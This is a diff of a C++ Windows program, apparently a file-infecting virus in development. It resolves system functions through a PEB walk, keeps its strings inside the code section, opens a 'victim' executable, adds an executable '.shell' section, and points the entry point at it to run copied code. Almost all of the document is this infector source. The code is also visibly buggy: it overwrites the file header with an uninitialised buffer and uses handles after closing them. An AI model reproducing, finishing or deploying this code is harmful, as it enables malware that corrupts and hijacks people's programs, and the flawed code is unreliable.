@@ -1,5 +1,7 @@
 #include <Windows.h>
 #include "peb-lookup.h"
+#include <string>
+#include <sstream>
 
 // Strings almacenados en la sección .text
 #pragma code_seg(".text")
@@ -26,7 +28,6 @@ char get_proc_name[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s'
 char kr32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
 char user32_dll_name[] = { 'u','s','e','r','3','2','.','d','l','l', 0 };
 char ucrtbase_dll_name[] = { 'u','c','r','t','b','a','s','e','.','d','l','l' };
-
 char message_box_name[] = { 'M','e','s','s','a','g','e','B','o','x','W', 0 };
 char cf_name[] = { 'C','r','e','a','t','e','F','i','l','e','A', 0 };
 char rf_name[] = { 'R','e','a','d','F','i','l','e', 0 };
@@ -49,64 +50,93 @@ const DWORD bufferSize = 64;
 char buffer[bufferSize] = { 0 };
 DWORD bytesRead;
 wchar_t wide_buffer[bufferSize]; // Crear un buffer Unicode
-
-// Definición de punteros a funciónes
-typedef int (*strncmp_fn)(const char*, const char*, size_t);
-
-typedef BOOL(*CloseHandle_fn)(HANDLE hObject);
-
-typedef BOOL(*UnmapViewOfFile_fn)(LPCVOID lpBaseAddress);
-
-typedef HANDLE(*CreateFileMapping_fn)(
-    HANDLE hFile,
-    LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
-    DWORD flProtect,
-    DWORD dwMaximumSizeHigh,
-    DWORD dwMaximumSizeLow,
-    LPCSTR lpName
-    );
-
-typedef LPVOID(*MapViewOfFile_fn)(
-    HANDLE hFileMappingObject,
-    DWORD dwDesiredAccess,
-    DWORD dwFileOffsetHigh,
-    DWORD dwFileOffsetLow,
-    SIZE_T dwNumberOfBytesToMap
-    );
-
-// Definición del puntero de función para strcpy_s
-typedef errno_t(CDECL* strcpy_s_fn)(
-    char* dest,
-    size_t destsz,
-    const char* src
-    );
-
-// Definición del puntero de función para ZeroMemory
-typedef void (WINAPI* ZeroMemory_fn)(PVOID, SIZE_T);
-
-// Definición del puntero de función para SetFilePointer
-
-typedef DWORD(*SetFilePointer_fn)(HANDLE, LONG, PLONG, DWORD);
-
-
-// Definición del puntero de función para SetEndOfFile
-typedef BOOL(WINAPI* SetEndOfFile_fn)(HANDLE hFile);
-
 // Definición del nombre de la función malloc
 char malloc_name[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };
-
-// Declaración del tipo de puntero a la función malloc
-typedef void* (*malloc_fn)(size_t);  // Tipo de puntero para malloc
-
 // Definición del nombre de la función memcpy
 char memcpy_name[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
 
-// Declaración del tipo de puntero a la función memcpy
-typedef void* (*memcpy_fn)(void* dest, const void* src, size_t n);  // Tipo de puntero para memcpy
+// Declarar las funciones globales
+HMODULE(WINAPI* _LoadLibraryA)(LPCSTR lpLibFileName);
+FARPROC(WINAPI* _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
+DWORD(WINAPI* _GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
+LPVOID(WINAPI* _MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
+BOOL(WINAPI* _UnmapViewOfFile)(LPCVOID lpBaseAddress);
+HANDLE(WINAPI* _CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
+BOOL(WINAPI* _ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
+int(WINAPI* _MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
+int(WINAPI* _MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
+BOOL(WINAPI* _CloseHandle)(HANDLE hObject);
+int(WINAPI* _strncmp)(const char* str1, const char* str2, size_t num);
+errno_t(CDECL* _strcpy_s)(char* dest, size_t destsz, const char* src);
+void(WINAPI* _ZeroMemory)(PVOID ptr, SIZE_T size);
+DWORD(WINAPI* _SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
+BOOL(WINAPI* _SetEndOfFile)(HANDLE hFile);
+void* (WINAPI* _malloc)(size_t size);
+void* (WINAPI* _memcpy)(void* dest, const void* src, size_t n);
+HANDLE(WINAPI* _CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+BOOL(WINAPI* _WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+void* (WINAPI* _memset)(void* dest, int value, size_t num);
+BOOL(WINAPI* _FlushViewOfFile)(LPCVOID lpBaseAddress, SIZE_T dwNumberOfBytesToFlush);
+DWORD(WINAPI* _GetLastError)();  // Declarar GetLastError
 
+// Función para inicializar las funciones globales
+bool InitializeFunctions() {
+    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
+    if (!base) return false;
 
+    _LoadLibraryA = (HMODULE(WINAPI*)(LPCSTR)) get_func_by_name((HMODULE)base, (LPSTR)load_lib_name);
+    _GetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_func_by_name((HMODULE)base, (LPSTR)get_proc_name);
+    if (!_LoadLibraryA || !_GetProcAddress) return false;
+
+    HMODULE k32_dll = _LoadLibraryA(kr32_dll_name);
+    HMODULE u32_dll = _LoadLibraryA(user32_dll_name);
+    HMODULE hLibC = _LoadLibraryA(ucrtbase_dll_name);
+
+    if (!k32_dll || !u32_dll || !hLibC) return false;
+    _CreateFileA = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)) _GetProcAddress(k32_dll, "CreateFileA");
+    _GetFileSize = (DWORD(WINAPI*)(HANDLE, LPDWORD)) _GetProcAddress(k32_dll, get_file_size_name);
+    _MapViewOfFile = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T)) _GetProcAddress(k32_dll, map_view_of_file_name);
+    _UnmapViewOfFile = (BOOL(WINAPI*)(LPCVOID)) _GetProcAddress(k32_dll, unmap_view_of_file_name);
+    _CreateFileMappingA = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR)) _GetProcAddress(k32_dll, create_file_mapping_name);
+    _ReadFile = (BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)) _GetProcAddress(k32_dll, rf_name);
+    _MessageBoxW = (int(WINAPI*)(HWND, LPCWSTR, LPCWSTR, UINT)) _GetProcAddress(u32_dll, message_box_name);
+    _MultiByteToWideChar = (int(WINAPI*)(UINT, DWORD, LPCCH, int, LPWSTR, int)) _GetProcAddress(k32_dll, mb_to_wc_name);
+    _CloseHandle = (BOOL(WINAPI*)(HANDLE)) _GetProcAddress(k32_dll, close_handle_name);
+    _strncmp = (int(WINAPI*)(const char*, const char*, size_t)) _GetProcAddress(hLibC, strncmp_name);
+    _strcpy_s = (errno_t(CDECL*)(char*, size_t, const char*)) _GetProcAddress(hLibC, "strcpy_s");
+    _ZeroMemory = (void(WINAPI*)(PVOID, SIZE_T)) _GetProcAddress(k32_dll, "ZeroMemory");
+
+    _SetFilePointer = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD)) _GetProcAddress(k32_dll, "SetFilePointer");
+    _SetEndOfFile = (BOOL(WINAPI*)(HANDLE)) _GetProcAddress(k32_dll, "SetEndOfFile");
+    _malloc = (void* (WINAPI*)(size_t)) _GetProcAddress(hLibC, malloc_name);
+    _memcpy = (void* (WINAPI*)(void*, const void*, size_t)) _GetProcAddress(hLibC, memcpy_name);
+
+    // Inicializar WriteFile, FlushViewOfFile y memset
+    _WriteFile = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED)) _GetProcAddress(k32_dll, "WriteFile");
+    _FlushViewOfFile = (BOOL(WINAPI*)(LPCVOID, SIZE_T)) _GetProcAddress(k32_dll, "FlushViewOfFile");
+    _memset = (void* (WINAPI*)(void*, int, size_t))_GetProcAddress(hLibC, "memset");
+
+    // Inicializar GetLastError
+    _GetLastError = (DWORD(WINAPI*)()) _GetProcAddress(k32_dll, "GetLastError");
+
+    return _GetFileSize && _MapViewOfFile && _UnmapViewOfFile && _CreateFileMappingA && _ReadFile && _MessageBoxW &&
+        _MultiByteToWideChar && _CloseHandle && _strncmp && _strcpy_s && _ZeroMemory && _SetFilePointer &&
+        _SetEndOfFile && _malloc && _memcpy && _CreateFileA && _WriteFile && _FlushViewOfFile && _memset && _GetLastError;
+}
+// Función para convertir un valor numérico a un string wide (wstring)
+std::wstring to_wstring(int value) {
+    std::wstringstream wss;
+    wss << value;
+    return wss.str();
+}
+void showError(DWORD error) {
+    std::wstring message = L"Error occurred. Error code: ";
+    message += std::to_wstring(error);
+
+    _MessageBoxW(0, message.c_str(), L"Error", MB_OK);
+}
 // Función para copiar la sección .text a .shell
-bool CopyTextToShell(LPVOID exeBase, DWORD textSectionSize, malloc_fn _malloc, memcpy_fn _memcpy) {
+bool CopyTextToShell(LPVOID exeBase, DWORD textSectionSize) {
     DWORD shellSectionSize = textSectionSize;  // O ajusta según sea necesario
 
     // Crear la sección .shell en la memoria mapeada
@@ -123,91 +153,139 @@ bool CopyTextToShell(LPVOID exeBase, DWORD textSectionSize, malloc_fn _malloc, m
     return true;
 }
 
-bool AddShellSectionAndModifyEntryPoint
-
-(HANDLE hFile_vic,
-CloseHandle_fn _CloseHandle,
-UnmapViewOfFile_fn _UnmapViewOfFile,
-CreateFileMapping_fn _CreateFileMapping,
-MapViewOfFile_fn _MapViewOfFile,
-strcpy_s_fn _strcpy_s,
-ZeroMemory_fn _ZeroMemory,
-SetFilePointer_fn _SetFilePointer,
-SetEndOfFile_fn _SetEndOfFile , MessageBoxW_fn _MessageBoxW
-)
-
-
-//(HANDLE hFile_vic, CloseHandle_fn _CloseHandle, UnmapViewOfFile_fn _UnmapViewOfFile , CreateFileMapping_fn _CreateFileMapping , MapViewOfFile_fn _MapViewOfFile , strcpy_s_fn _strcpy_s, ZeroMemory_fn _ZeroMemory, SetFilePointer_fn _SetFilePointer , SetFilePointer_fn _SetEndOfFile)
-{
-    
-
-   
-    HANDLE hMapping = _CreateFileMapping(hFile_vic, nullptr, PAGE_READWRITE, 0, 0, nullptr);
+bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic) {
+    const DWORD shellSectionSize = 4096;  // Por ejemplo, 4 KB para el tamaño de la sección
+    HANDLE hMapping = _CreateFileMappingA(hFile_vic, nullptr, PAGE_READWRITE, 0, 0, nullptr);
+  
     if (!hMapping) {
-      //  std::cerr << "Error al crear el mapping de archivo.\n";
+        // Handle error if mapping creation fails
+        _MessageBoxW(0, L"Error creating file mapping.", L"Error", MB_OK);
         _CloseHandle(hFile_vic);
         return false;
     }
-    _MessageBoxW(0, L"hMapping ", L"Depuracion", MB_OK);
+
+    _MessageBoxW(0, L"hMapping created", L"Debugging", MB_OK);
+
     BYTE* pBase = (BYTE*)_MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
     if (!pBase) {
-        //std::cerr << "Error al mapear el archivo en memoria.\n";
+        // Handle error if mapping fails
+        _MessageBoxW(0, L"Error mapping file to memory.", L"Error", MB_OK);
         _CloseHandle(hMapping);
         _CloseHandle(hFile_vic);
         return false;
     }
 
-    // Obtén las estructuras principales del archivo PE
+    _MessageBoxW(0, L"File mapped to memory", L"Debugging", MB_OK);
+
+    // Check PE file structure by validating DOS header
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pBase;
     if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-        //std::cerr << "El archivo no es un PE válido.\n";
+        // Not a valid PE file
+        _MessageBoxW(0, L"Invalid PE file (DOS signature check failed).", L"Error", MB_OK);
         _UnmapViewOfFile(pBase);
         _CloseHandle(hMapping);
         _CloseHandle(hFile_vic);
         return false;
     }
 
-    PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)(pBase + dosHeader->e_lfanew);
+    _MessageBoxW(0, L"DOS signature exists", L"Debugging", MB_OK);
+
+    // Locate the NT header by adding the DOS header's e_lfanew offset
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pBase + dosHeader->e_lfanew);
     if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
-       // std::cerr << "El archivo no contiene una cabecera NT válida.\n";
+        // Invalid NT header
+        _MessageBoxW(0, L"Invalid PE file (NT signature check failed).", L"Error", MB_OK);
         _UnmapViewOfFile(pBase);
         _CloseHandle(hMapping);
         _CloseHandle(hFile_vic);
         return false;
     }
 
-    PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(ntHeaders);
-    int numberOfSections = ntHeaders->FileHeader.NumberOfSections;
+    _MessageBoxW(0, L"NT signature exists", L"Debugging", MB_OK);
 
-    // Configura una nueva sección
-    PIMAGE_SECTION_HEADER newSection = &sectionHeaders[numberOfSections];
-    _ZeroMemory(newSection, sizeof(IMAGE_SECTION_HEADER));
-    _strcpy_s((char*)newSection->Name, IMAGE_SIZEOF_SHORT_NAME, ".shell");
+    // Now we can proceed with modifying the PE file.
+    // Let's say we want to inject a new section (.shell) and modify the entry point.
+    // 1. Update the section headers
+    // 2. Modify the entry point in the NT headers to point to the new shellcode section
+
+    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
+    DWORD numberOfSections = ntHeaders->FileHeader.NumberOfSections;
+
+    // Find a free slot to add the new section
+    PIMAGE_SECTION_HEADER newSectionHeader = &sectionHeader[numberOfSections];
+
+    _MessageBoxW(0, L"New Section Created", L"Debugging", MB_OK);
+    _memset(newSectionHeader, 0, sizeof(IMAGE_SECTION_HEADER)); // Initialize the new section header
     
-    newSection->Misc.VirtualSize = 0x1000; // Tamaño virtual de la sección
-    newSection->VirtualAddress = CUSTOM_ALIGN_UP(sectionHeaders[numberOfSections - 1].VirtualAddress + sectionHeaders[numberOfSections - 1].Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
-    newSection->SizeOfRawData = CUSTOM_ALIGN_UP(0x1000, ntHeaders->OptionalHeader.FileAlignment);
-    newSection->PointerToRawData = CUSTOM_ALIGN_UP(sectionHeaders[numberOfSections - 1].PointerToRawData + sectionHeaders[numberOfSections - 1].SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
-    newSection->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;
+    _MessageBoxW(0, L"memset", L"Debugging", MB_OK);
+    // Set section name and characteristics
+    _memcpy(newSectionHeader->Name, ".shell", sizeof(".shell") - 1);
+    newSectionHeader->Misc.VirtualSize = shellSectionSize;
+    newSectionHeader->VirtualAddress = ntHeaders->OptionalHeader.SizeOfImage;
+    newSectionHeader->SizeOfRawData = shellSectionSize;
+    newSectionHeader->PointerToRawData = ntHeaders->OptionalHeader.SizeOfImage;
 
-    // Actualiza los encabezados del PE
-    ntHeaders->FileHeader.NumberOfSections += 1;
-    ntHeaders->OptionalHeader.SizeOfImage = newSection->VirtualAddress + newSection->Misc.VirtualSize;
+ 
+    // Modify the entry point to point to the new shellcode section
+    ntHeaders->OptionalHeader.AddressOfEntryPoint = newSectionHeader->VirtualAddress;
 
-    // Modifica el Entry Point
-    ntHeaders->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
+    // Update the SizeOfImage field in the OptionalHeader
+    ntHeaders->OptionalHeader.SizeOfImage += shellSectionSize;
 
-    // Asegúrate de escribir la nueva sección en el archivo
-    _SetFilePointer(hFile_vic, newSection->PointerToRawData + newSection->SizeOfRawData, nullptr, FILE_BEGIN);
+   
 
-    _SetEndOfFile(hFile_vic);
+    // Convierte a una cadena multibyte de forma segura
+    char* charString = new char[12];
+    size_t convertedChars = 0;
 
-    // Limpia los recursos
+
+    // Luego usa strcpy_s para copiar la cadena convertida
+    
+    if (pBase) {
+        _strcpy_s(pBase, 12, charString);
+           _FlushViewOfFile(pBase, 0);
+           _UnmapViewOfFile(pBase);
+           _MessageBoxW(0, L"Hola ", L"Error", MB_OK);
+        }
+        _CloseHandle(hMapping);
+    
+    _CloseHandle(hFile_vic);
+
+   
+   
+    if (_SetFilePointer(hFile_vic, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
+       
+        _MessageBoxW(0, L"Error setting file pointer. " , L"Error", MB_OK);
+        _UnmapViewOfFile(pBase);
+        _CloseHandle(hMapping);
+        _CloseHandle(hFile_vic);
+        return false;
+    }
+
+    if (pBase == nullptr) {
+        _MessageBoxW(0, L"Mapping failed: pBase is null.", L"Error", MB_OK);
+        _UnmapViewOfFile(pBase);
+        _CloseHandle(hMapping);
+        _CloseHandle(hFile_vic);
+        return false;
+    }
+
+
+    // Luego, escribe los datos de vuelta al archivo
+    DWORD bytesWritten = 0;
+    BOOL writeSuccess = _WriteFile(hFile_vic, pBase, ntHeaders->OptionalHeader.SizeOfImage, &bytesWritten, NULL);
+    if (!writeSuccess || bytesWritten != ntHeaders->OptionalHeader.SizeOfImage) {
+      
+        _MessageBoxW(0, L"Failed to write to file. Error code: ", L"Error", MB_OK);
+        return false;
+    }
+
+    // Cleanup and close handles
     _UnmapViewOfFile(pBase);
     _CloseHandle(hMapping);
     _CloseHandle(hFile_vic);
 
-    //std::cout << "Sección .shell agregada y Entry Point modificado con éxito.\n";
+    _MessageBoxW(0, L"PE File modified successfully.", L"Success", MB_OK);
     return true;
 }
 
@@ -217,7 +295,7 @@ DWORD ALIGN_UP(DWORD size, DWORD align) {
 }
 
 
-void* GetTextSection(void* exeBase, DWORD* sectionSize, strncmp_fn strncmp_func) {
+void* GetTextSection(void* exeBase, DWORD* sectionSize) {
 
 
 
@@ -238,7 +316,7 @@ void* GetTextSection(void* exeBase, DWORD* sectionSize, strncmp_fn strncmp_func)
 
     // Iterar por las secciones
     for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-        if (strncmp_func((char*)sectionHeaders[i].Name, ".text", 5) == 0) {
+        if (_strncmp((char*)sectionHeaders[i].Name, ".text", 5) == 0) {
             *sectionSize = sectionHeaders[i].Misc.VirtualSize;
             return (void*)((BYTE*)exeBase + sectionHeaders[i].VirtualAddress);
         }
@@ -248,216 +326,10 @@ void* GetTextSection(void* exeBase, DWORD* sectionSize, strncmp_fn strncmp_func)
 }
 
 int main() {
- 
-    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
-    if (!base) {
-        return 1;
-    }
 
-    // resolve loadlibraryA() address
-    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)load_lib_name);
-    if (!load_lib) {
-        return 2;
-    }
+    InitializeFunctions();
 
-    // resolve getprocaddress() address
-    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)get_proc_name);
-    if (!get_proc) {
-        return 3;
-    }
-
-    // loadlibrarya and getprocaddress function definitions
-    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
-    FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
-        = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;
-
-    // load user32.dll
-    LPVOID u32_dll = _LoadLibraryA(user32_dll_name);
-    // load kernell32.dll
-    LPVOID k32_dll = _LoadLibraryA(kr32_dll_name);
-    // Cargar la biblioteca (reemplazar con la biblioteca correcta si aplica)
-    LPVOID hLibC = _LoadLibraryA(ucrtbase_dll_name); // Biblioteca estándar C para Windows
-   
-    DWORD(WINAPI * _GetFileSize)(
-        _In_ HANDLE hFile,
-        _Out_opt_ LPDWORD lpFileSizeHigh
-        ) = (DWORD(WINAPI*)(
-            HANDLE, LPDWORD)) _GetProcAddress((HMODULE)k32_dll, get_file_size_name);
-
-    LPVOID(WINAPI * _MapViewOfFile)(
-        _In_ HANDLE hFileMappingObject,
-        _In_ DWORD dwDesiredAccess,
-        _In_ DWORD dwFileOffsetHigh,
-        _In_ DWORD dwFileOffsetLow,
-        _In_ SIZE_T dwNumberOfBytesToMap
-        ) = (LPVOID(WINAPI*)(
-            HANDLE, DWORD, DWORD, DWORD, SIZE_T)) _GetProcAddress((HMODULE)k32_dll, map_view_of_file_name);
-
-    BOOL(WINAPI * _UnmapViewOfFile)(
-        _In_ LPCVOID lpBaseAddress
-        ) = (BOOL(WINAPI*)(
-            LPCVOID)) _GetProcAddress((HMODULE)k32_dll, unmap_view_of_file_name);
-
-    HANDLE(WINAPI * _CreateFileMappingA)(
-        _In_ HANDLE hFile,
-        _In_opt_ LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
-        _In_ DWORD flProtect,
-        _In_ DWORD dwMaximumSizeHigh,
-        _In_ DWORD dwMaximumSizeLow,
-        _In_opt_ LPCSTR lpName
-        ) = (HANDLE(WINAPI*)(
-            HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR)) _GetProcAddress((HMODULE)k32_dll, create_file_mapping_name);
-
-    // Verificar si se resolvieron correctamente
-    if (!_GetFileSize || !_MapViewOfFile || !_UnmapViewOfFile || !_CreateFileMappingA) {
-        
-        return -1;
-    }
-    HANDLE(WINAPI * _CreateFileA)(
-        _In_ LPCSTR lpFileName,
-        _In_ DWORD dwDesiredAccess,
-        _In_ DWORD dwShareMode,
-        _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-        _In_ DWORD dwCreationDisposition,
-        _In_ DWORD dwFlagsAndAttributes,
-        _In_opt_ HANDLE hTemplateFile
-        ) = (HANDLE(WINAPI*)(
-            _In_ LPCSTR,
-            _In_ DWORD,
-            _In_ DWORD,
-            _In_opt_ LPSECURITY_ATTRIBUTES,
-            _In_ DWORD,
-            _In_ DWORD,
-            _In_opt_ HANDLE
-            )) _GetProcAddress((HMODULE)k32_dll, cf_name);
-
-    if (_CreateFileA == INVALID_HANDLE_VALUE)return 3;
-
-    // Declarar el puntero a la función ReadFile
-    // Define ReadFile
-    BOOL(WINAPI * _ReadFile)(
-        HANDLE hFile,
-        LPVOID lpBuffer,
-        DWORD nNumberOfBytesToRead,
-        LPDWORD lpNumberOfBytesRead,
-        LPOVERLAPPED lpOverlapped
-        ) = (BOOL(WINAPI*)(
-            HANDLE,
-            LPVOID,
-            DWORD,
-            LPDWORD,
-            LPOVERLAPPED)) _GetProcAddress((HMODULE)k32_dll, rf_name);
-
-    if (!_ReadFile) return 4;
-
-    // messageboxw function definition
-    int (WINAPI * _MessageBoxW)(
-        _In_opt_ HWND hWnd,
-        _In_opt_ LPCWSTR lpText,
-        _In_opt_ LPCWSTR lpCaption,
-        _In_ UINT uType) = (int (WINAPI*)(
-            _In_opt_ HWND,
-            _In_opt_ LPCWSTR,
-            _In_opt_ LPCWSTR,
-            _In_ UINT)) _GetProcAddress((HMODULE)u32_dll, message_box_name);
-
-    if (_MessageBoxW == NULL) return 5;
-
-    // Resolver la dirección de MultiByteToWideChar
-    int (WINAPI * _MultiByteToWideChar)(
-        _In_ UINT CodePage,
-        _In_ DWORD dwFlags,
-        _In_NLS_string_(cbMultiByte) LPCCH lpMultiByteStr,
-        _In_ int cbMultiByte,
-        _Out_writes_opt_(cchWideChar) LPWSTR lpWideCharStr,
-        _In_ int cchWideChar
-        ) = (int (WINAPI*)(
-            UINT, DWORD, LPCCH, int, LPWSTR, int)) _GetProcAddress((HMODULE)k32_dll, mb_to_wc_name);
-    // Resolver la dirección de CloseHandle
-    BOOL(WINAPI * _CloseHandle)(HANDLE hObject);
-    _CloseHandle = (BOOL(WINAPI*)(HANDLE)) _GetProcAddress((HMODULE)k32_dll, close_handle_name);
-
-    // Declaración del puntero a función para strncmp
-    int (WINAPI * _strncmp)(
-        _In_ const char* str1,
-        _In_ const char* str2,
-        _In_ size_t num
-        ) = (int (WINAPI*)(
-            const char*, const char*, size_t))  _GetProcAddress((HMODULE)hLibC, strncmp_name);
-
-    if (!_strncmp) {
-       
- 
-        return -1;
-    }
-
-    // Definición de strcpy_s similar a MessageBoxW
-    errno_t(CDECL * _strcpy_s)(
-        char* dest,
-        size_t destsz,
-        const char* src
-        ) = (errno_t(CDECL*)(
-            char*,
-            size_t,
-            const char*
-            ))  _GetProcAddress((HMODULE)hLibC, "strcpy_s");
-
-    if (!_strcpy_s) {
-
-
-        return -1;
-    }
-
-    // Definición de _ZeroMemory
-    void (WINAPI * _ZeroMemory)(
-        PVOID ptr,
-        SIZE_T size
-        ) = (void (WINAPI*)(
-            PVOID,
-            SIZE_T
-            ))  _GetProcAddress((HMODULE)k32_dll, "ZeroMemory");
-
-    // Definición de _SetFilePointer
-    DWORD(WINAPI * _SetFilePointer)(
-        HANDLE hFile,
-        LONG lDistanceToMove,
-        PLONG lpDistanceToMoveHigh,
-        DWORD dwMoveMethod
-        ) = (DWORD(WINAPI*)(
-            HANDLE,
-            LONG,
-            PLONG,
-            DWORD
-            )) //GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetFilePointer");
-    _GetProcAddress((HMODULE)k32_dll, "SetFilePointer");
-    // Definición de _SetEndOfFile
-      // Obtener la dirección de la función SetEndOfFile
-    SetEndOfFile_fn _SetEndOfFile = (SetEndOfFile_fn)//GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetEndOfFile");
-    _GetProcAddress((HMODULE)k32_dll, "SetEndOfFile");
-    
-    if (!_SetEndOfFile) {
-       
-        return 1;
-    }
-
- 
-   // BOOL(WINAPI * _SetEndOfFile)(HANDLE hFile_vic) = (BOOL(WINAPI*)(HANDLE)) GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetEndOfFile");
-    // Declaración del puntero a función para malloc
-    void* (WINAPI * _malloc)(size_t size) = (malloc_fn)_GetProcAddress((HMODULE)hLibC, malloc_name);
-
-    // Comprobación de error en malloc
-    if (!_malloc) {
-        return -1; // Error si no se encuentra malloc
-    }
-
-    // Declaración del puntero a función para memcpy
-    void* (WINAPI * _memcpy)(void* dest, const void* src, size_t n) = (memcpy_fn)_GetProcAddress((HMODULE)hLibC, memcpy_name);
-
-    // Comprobación de error en memcpy
-    if (!_memcpy) {
-        return -1; // Error si no se encuentra memcpy
-    }
-
+    _MessageBoxW(0, L"Inicio", L"Depuracion", MB_OK);
     //Inicio 
     HANDLE hFile = _CreateFileA(
         fileName,              // Nombre del archivo
@@ -472,34 +344,27 @@ int main() {
         _MessageBoxW(0, L"Error al abrir el archivo", L"Error", MB_OK);
         return 5; // Error al abrir el archivo
     }
-    // invoke the message box winapi
-    _MessageBoxW(0, msg_content, msg_title, MB_OK);
+    // invoke the message box for debug
+    _MessageBoxW(0, L"File was opened for read", L"Depuracion", MB_OK);
 
-    if (hFile != INVALID_HANDLE_VALUE) {
-        BOOL result = _ReadFile(hFile, buffer, bufferSize - 1, &bytesRead, NULL);
-        if (result && bytesRead > 0) {
-            // Agregar carácter nulo para terminar la cadena
-            buffer[bytesRead] = '\0';
-            // Mostrar contenido leído (requiere `_MessageBoxW` o `_MultiByteToWideChar`)
-            wchar_t wideBuffer[bufferSize] = { 0 };
-            _MultiByteToWideChar(CP_ACP, 0, buffer, bytesRead, wideBuffer, bufferSize);
-            _MessageBoxW(0, wideBuffer, L"Contenido del Archivo", MB_OK);
+    BOOL result = _ReadFile(hFile, buffer, bufferSize - 1, &bytesRead, NULL);
+    _MessageBoxW(0, L"File was read", L"Depuracion", MB_OK);
+    if (result && bytesRead > 0) {
+      // Agregar carácter nulo para terminar la cadena
+      buffer[bytesRead] = '\0';
+       // Mostrar contenido leído (requiere `_MessageBoxW` o `_MultiByteToWideChar`)
+      wchar_t wideBuffer[bufferSize] = { 0 };
+      _MultiByteToWideChar(CP_ACP, 0, buffer, bytesRead, wideBuffer, bufferSize);
+       _MessageBoxW(0, wideBuffer, L"Contenido del Archivo", MB_OK);
         }
         else {
-            _MessageBoxW(0, L"No se pudo leer el archivo", L"Error", MB_OK);
+            _MessageBoxW(0, L"I cant read a main file!", L"Error", MB_OK);
         }
-        // invoke the message box winapi
-
+   
         _CloseHandle(hFile);
         // invoke the message box winapi
-        _MessageBoxW(0, L"_CloseHandle(hFile)", L"Depuracion", MB_OK);
-    }
-    else {
-        _MessageBoxW(0, L"Error al abrir el archivo", L"Error", MB_OK);
-    }
-
-
-
+        _MessageBoxW(0, L"File was closed", L"Depuracion", MB_OK);
+  
     hFile = _CreateFileA(
         fileName,              // Nombre del archivo
         GENERIC_READ,          // Permisos de lectura
@@ -540,7 +405,7 @@ int main() {
     _MessageBoxW(0, L"MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)", L"Depuracion", MB_OK);
 
     DWORD sectionSize = 0;
-    void* textSection = GetTextSection(exeBase, &sectionSize, _strncmp);
+    void* textSection = GetTextSection(exeBase, &sectionSize);
     if (textSection) {
         _MessageBoxW(0, L"Sección .text encontrada.  ", L"Aviso", MB_OK);
     
@@ -562,7 +427,7 @@ int main() {
     // invoke the message box winapi
